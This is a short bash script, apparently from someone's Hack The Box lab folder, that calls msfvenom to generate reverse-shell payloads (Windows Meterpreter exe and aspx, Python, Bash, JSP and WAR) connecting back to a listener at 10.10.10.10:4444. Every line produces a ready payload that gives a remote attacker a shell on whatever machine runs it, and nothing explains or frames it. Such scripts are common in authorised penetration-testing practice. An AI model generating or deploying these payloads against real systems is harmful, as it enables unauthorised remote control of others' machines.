#!/bin/bash

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > ~/htb/reverse-shell/shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f aspx > ~/htb/reverse-shell/shell.aspx

msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/reverse-shell/shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/reverse-shell/shell.sh


msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/reverse-shell/shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > ~/htb/reverse-shell/shell.war
